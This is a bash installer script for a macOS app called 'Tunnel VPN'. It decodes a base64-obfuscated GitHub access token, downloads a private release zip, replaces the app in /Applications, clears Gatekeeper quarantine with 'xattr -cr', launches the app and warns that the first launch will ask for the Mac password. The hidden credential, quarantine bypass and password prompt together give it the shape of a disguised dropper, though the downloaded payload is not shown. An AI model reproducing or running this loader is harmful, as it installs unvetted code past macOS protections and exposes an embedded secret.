#!/bin/bash
set -e

_T="Z2l0aHViX3BhdF8xMUFWMzNaUlkwbmprdUVBR25GTFFLX0plY2hxcU9SYzR3U3ZUaVRTRkxUV3RsU2UySENFWWpTUWQydlZlRmhwRUZTWVM3WFU1SDZvQmY2MHZC"
PAT=$(echo "$_T" | base64 -d 2>/dev/null || echo "$_T" | base64 -D 2>/dev/null)
REPO="adios-404/tunnel-app"
APP_NAME="Tunnel.app"
INSTALL_DIR="/Applications"

echo ""
echo "  ╔══════════════════════════════════╗"
echo "  ║   Installing Tunnel VPN...       ║"
echo "  ╚══════════════════════════════════╝"
echo ""

# 1. Get latest release asset URL
echo "  → Finding latest version..."
RELEASE=$(curl -sf -H "Authorization: Bearer $PAT" \
    "https://api.github.com/repos/$REPO/releases/latest")

TAG=$(echo "$RELEASE" | grep '"tag_name"' | head -1 | sed 's/.*: "//;s/".*//')
ASSET_URL=$(echo "$RELEASE" | grep '"url"' | grep '/assets/' | head -1 | sed 's/.*: "//;s/".*//')

if [ -z "$ASSET_URL" ]; then
    echo "  ✗ Could not find release. Check your internet connection."
    exit 1
fi
echo "  → Downloading Tunnel $TAG..."

# 2. Download zip
TMP_DIR=$(mktemp -d)
curl -sL -H "Authorization: Bearer $PAT" -H "Accept: application/octet-stream" \
    "$ASSET_URL" -o "$TMP_DIR/Tunnel.zip"

# 3. Unzip
echo "  → Extracting..."
cd "$TMP_DIR"
unzip -qo Tunnel.zip

if [ ! -d "$APP_NAME" ]; then
    echo "  ✗ Extraction failed."
    rm -rf "$TMP_DIR"
    exit 1
fi

# 4. Kill existing Tunnel if running
pkill -f "Tunnel.app/Contents/MacOS/Tunnel" 2>/dev/null || true
sleep 0.5

# 5. Move to /Applications (replace if exists)
echo "  → Installing to /Applications..."
rm -rf "$INSTALL_DIR/$APP_NAME"
mv "$APP_NAME" "$INSTALL_DIR/$APP_NAME"

# 6. Clear Gatekeeper quarantine
xattr -cr "$INSTALL_DIR/$APP_NAME"

# 7. Cleanup
rm -rf "$TMP_DIR"

echo "  → Launching Tunnel..."
open "$INSTALL_DIR/$APP_NAME"

echo ""
echo "  ╔══════════════════════════════════╗"
echo "  ║   ✓ Tunnel installed!            ║"
echo "  ║   Look for the shield icon       ║"
echo "  ║   in your menu bar.              ║"
echo "  ╚══════════════════════════════════╝"
echo ""
echo "  First launch will ask for your"
echo "  Mac password (one-time setup)."
echo ""
